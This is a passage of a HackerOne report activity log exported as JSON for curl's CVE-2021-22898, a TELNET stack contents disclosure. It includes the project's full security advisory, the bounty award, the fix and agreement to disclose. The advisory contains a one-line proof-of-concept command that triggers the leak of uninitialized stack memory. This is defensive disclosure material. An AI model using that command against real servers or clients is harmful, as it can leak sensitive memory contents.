+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11567306,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportTitleUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-04-29T15:42:36.543Z",
+      "updated_at": "2021-04-29T15:42:36.543Z",
+      "additional_data": {
+        "old_title": "telnet protocol CURL_TELOPT_NEW_ENVIRON stack disclosure",
+        "new_title": "CVE-2021-22898: TELNET stack contents disclosure"
+      },
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11567406,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Security advisory (also attached)\n\n---\n\nTELNET stack contents disclosure\n================================\n\nProject curl Security Advisory, May 26th 2021 -\n[Permalink](https://curl.se/docs/CVE-2021-22898.html)\n\nVULNERABILITY\n-------------\n\ncurl supports the `-t` command line option, known as `CURLOPT_TELNETOPTIONS`\nin libcurl. This rarely used option is used to send variable=content pairs to\nTELNET servers.\n\nDue to flaw in the option parser for sending `NEW_ENV` variables, libcurl\ncould be made to pass on uninitialized data from a stack based buffer to the\nserver. Therefore potentially revealing sensitive internal information to the\nserver using a clear-text network protocol.\n\nThis could happen because curl did not check the return code from a\n`sscanf(command, \"%127[^,],%127s\")` function invoke correctly, and would leave\nthe piece of the send buffer uninitialized for the value part if it was\nprovided longer than 127 bytes. The buffer used for this is 2048 bytes big and\nthe *variable* part of the *variable=content* pairs would be stored correctly\nin the send buffer, making curl sending \"interleaved\" bytes sequences of stack\ncontents. A single curl TELNET handshake could then be made to send off a\ntotal of around 1800 bytes of (non-contiguous) stack contents in this style:\n\n    [control byte]name[control byte]\n    stack contents\n    [control byte]name[control byte]\n    stack contents\n    ...\n\nAn easy proof of concept command line looks like this:\n\n    curl telnet://example.com -tNEW_ENV=a,bbbbbb (256 'b's)\n\nWe are not aware of any exploit of this flaw.\n\nINFO\n----\n\nThis flaw has existed in curl since commit\n[a1d6ad2610](https://github.com/curl/curl/commit/a1d6ad2610) in libcurl 7.7,\nreleased on March 22, 2001.\n\nThe Common Vulnerabilities and Exposures (CVE) project has assigned the name\nCVE-2021-22898 to this issue.\n\nCWE-457: Use of Uninitialized Variable\n\nSeverity: Median\n\nAFFECTED VERSIONS\n-----------------\n\n- Affected versions: curl 7.7 to and including 7.76.1\n- Not affected versions: curl < 7.7 and curl >= 7.77.0\n\nAlso note that libcurl is used by many applications, and not always advertised\nas such.\n\nTHE SOLUTION\n------------\n\nUse sscanf() properly and only use properly filled-in buffers.\n\nA [fix for CVE-2021-22898](URL)\n\n(The patch URL will change in the final published version of this advisory)\n\nRECOMMENDATIONS\n--------------\n\n A - Upgrade curl to version 7.77.0\n\n B - Apply the patch to your local version\n\n C - Avoid using `CURLOPT_TELNETOPTIONS`\n\nTIMELINE\n--------\n\nThis issue was reported to the curl project on April 27, 2021.\n\nThis advisory was posted on May 26, 2021.\n\nCREDITS\n-------\n\nThis issue was reported and patched by Harry Sintonen.\n\nThanks a lot!\n",
+      "automated_response": false,
+      "created_at": "2021-04-29T15:55:38.699Z",
+      "updated_at": "2021-04-29T15:55:38.699Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1283202,
+          "filename": "CVE-2021-22898.md",
+          "type": "text/markdown",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lohx631t1vdviq5tr0axvqow3btm?response-content-disposition=attachment%3B%20filename%3D%22CVE-2021-22898.md%22%3B%20filename%2A%3DUTF-8%27%27CVE-2021-22898.md&response-content-type=text%2Fmarkdown&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=de0f14b886fd176df6fb2fb278296be59f523e1c308fb2845052946a816cc354"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11671153,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "The curl security team has decided to reward hacker @nyymi  with the amount of 1000 USD for finding and reporting this issue. Many thanks for your great work!",
+      "automated_response": false,
+      "created_at": "2021-05-08T15:16:53.236Z",
+      "updated_at": "2021-05-08T15:16:53.236Z",
+      "actor": {
+        "url": "/curl",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "curl"
+        }
+      },
+      "bounty_amount": "1000.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "curl",
+      "collaborator": {
+        "username": "nyymi",
+        "url": "/nyymi"
+      }
+    },
+    {
+      "id": 11676747,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> Severity: Median\n\ns/Median/Medium/g",
+      "automated_response": false,
+      "created_at": "2021-05-09T20:29:41.242Z",
+      "updated_at": "2021-05-09T20:29:41.242Z",
+      "actor": {
+        "username": "nyymi",
+        "cleared": false,
+        "verified": false,
+        "url": "/nyymi",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11676846,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks, fixed in my local version!",
+      "automated_response": false,
+      "created_at": "2021-05-09T21:09:58.166Z",
+      "updated_at": "2021-05-09T21:09:58.166Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11888808,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T07:23:29.554Z",
+      "updated_at": "2021-05-26T07:23:29.554Z",
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84ff8a0b7c34ee34a86130a3d0d905f8c714119e039bb8bd8ebc21ea987b393c"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "nyymi",
+        "url": "/nyymi"
+      },
+      "genius_execution_id": null,
+      "team_handle": "curl"
+    },
+    {
+      "id": 11888821,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-05-26T07:25:10.705Z",
+      "updated_at": "2021-05-26T07:25:10.705Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "bagder",
+        "cleared": false,
+        "verified": false,
+        "url": "/bagder",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071252Z&X-Amz-Expires=3586&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhK